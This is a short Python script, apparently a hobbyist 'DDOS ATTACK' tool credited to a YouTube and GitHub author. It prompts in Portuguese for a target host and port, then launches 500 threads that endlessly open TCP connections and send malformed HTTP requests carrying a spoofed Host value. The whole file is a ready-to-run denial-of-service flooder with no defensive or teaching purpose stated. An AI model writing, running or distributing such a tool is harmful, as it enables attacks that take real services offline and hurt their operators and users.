import socket
import threading
from rich.console import Console
console = Console()

console.print(''' 
____________ _____ _____    ___ _____ _____ ___  _____  _   __
|  _  \  _  \  _  /  ___|  / _ \_   _|_   _/ _ \/  __ \| | / /
| | | | | | | | | \ `--.  / /_\ \| |   | |/ /_\ \ /  \/| |/ / 
| | | | | | | | | |`--. \ |  _  || |   | ||  _  | |    |    \ 
| |/ /| |/ /\ \_/ /\__/ / | | | || |   | || | | | \__/\| |\  |
|___/ |___/  \___/\____/  \_| |_/\_/   \_/\_| |_/\____/\_| \_/                                                                                                                    
''',style="#f700f3 bold")
print('='*30)
console.print("[#e100ff]Author[/]  : [#00fff6]Thor_Kryp[/]")
console.print ("[#e100ff]YouTube[/] : [#00fff6]https://www.youtube.com/channel/UCwaJ7N2g1yP8bqzubB6AxNw[/]")
console.print ("[#e100ff]Github[/]  : [#00fff6]https://github.com/Thorkrz[/] ")
print('='*30)


target = input('Informe o Alvo: ')
fake_ip = '503.042.320.222'
port = int(input('Informe a Porta: '))
print('='*30)
times_connected = 0

def dos():
    while True:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect((target, port))
            server.sendto(("GET / "+ target +" HTTP/1.1\r\n").encode('ascii'), (target, port))
            server.sendto(("Host: " + fake_ip + " HTTP/1.1\r\n\r\n").encode('ascii'), (target, port))
            server.close()
        except:
            continue

        global times_connected
        times_connected += 1

        if times_connected % 500 == 0:
            print(f'Enviando pacotes {times_connected}' )

for i in range(500):
    thread = threading.Thread(target=dos)
    thread.start()